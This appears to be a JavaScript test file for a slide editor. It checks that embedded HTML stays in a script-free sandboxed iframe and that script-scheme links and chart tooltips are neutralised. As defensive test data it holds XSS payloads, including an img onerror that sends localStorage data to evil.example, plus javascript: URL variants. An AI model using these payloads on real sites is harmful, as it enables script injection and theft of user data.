// An embed's html never runs in the host page (found 2026-11-05): it is the srcdoc of a sandboxed frame (no
// scripts, an opaque origin) behind a policy that allows no script, so a deck cannot read the session of the person
// who opens it.
import test from 'node:test';
import assert from 'node:assert/strict';
import { renderToStaticMarkup } from 'react-dom/server';
import { SlideStage, ElementView } from '../src/slides/index.js';

const PLANT = '<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.length)">';
const embed = (html) => ({ id: 'e1', type: 'embed', frame: { x: 0, y: 0, w: 400, h: 300 }, style: {}, content: { html } });

test('an embed renders as a sandboxed frame, its markup escaped inside srcdoc', () => {
  const html = renderToStaticMarkup(<ElementView el={embed(PLANT)} />);
  assert.match(html, /<iframe [^>]*sandbox=""/);
  assert.ok(!html.includes('<img'), 'the planted element is not markup in the page');
  assert.ok(!/allow-scripts|allow-same-origin/.test(html));
  assert.match(html, /srcDoc="|srcdoc="/i);
  assert.ok(html.includes('script-src &#x27;none&#x27;') || html.includes("script-src 'none'"), 'the policy forbids scripts');
});

test('a whole slide carries no embed markup outside the frame', () => {
  const html = renderToStaticMarkup(<SlideStage slide={{ id: 's1', elements: [embed(PLANT), embed('<script>alert(1)</script>')] }} theme={{}} />);
  assert.ok(!html.includes('<img') && !html.includes('<script'));
  assert.equal((html.match(/<iframe /g) || []).length, 2);
});

test('an empty embed is an empty sandboxed frame', () => {
  const html = renderToStaticMarkup(<ElementView el={embed('')} />);
  assert.match(html, /<iframe [^>]*sandbox=""/);
});

// The renderer keeps a deck inert whatever its source (a peer can write the live document directly): a link is a
// link only when it is http(s) or mailto, and a chart's tooltip draws text.
import * as E from '../src/slides/elements.jsx';
const text = (link) => ({ id: 't1', type: 'text', frame: { x: 0, y: 0, w: 400, h: 100 }, style: {},
  content: { runs: [{ text: 'go', marks: [{ link }] }] } });

test('a script link renders as plain text; an http link stays a link', () => {
  for (const bad of ['javascript:alert(1)', ' javascript:alert(1)', 'java\tscript:alert(1)', 'data:text/html,x', 'vbscript:x']) {
    const html = renderToStaticMarkup(<ElementView el={text(bad)} />);
    assert.ok(!/href=/.test(html) && html.includes('go'), bad);
  }
  assert.match(renderToStaticMarkup(<ElementView el={text('https://example.com/a')} />), /href="https:\/\/example.com\/a"/);
});

test('a chart spec draws tooltips as text and drops script title links', () => {
  assert.equal(typeof E.safeChartSpec, 'function');
  const spec = { title: { text: 't', link: 'javascript:alert(1)', sublink: 'https://example.com' },
                 tooltip: { formatter: '<img src=x onerror=alert(1)>' } };
  const out = E.safeChartSpec(spec);
  assert.equal(out.tooltip.renderMode, 'richText');
  assert.ok(!('link' in out.title) && out.title.sublink === 'https://example.com');
  assert.equal(spec.title.link, 'javascript:alert(1)', 'the deck itself is untouched');
  assert.deepEqual(E.safeChartSpec({ tooltip: [{}, { show: true }] }).tooltip.map((t) => t.renderMode), ['richText', 'richText']);
});
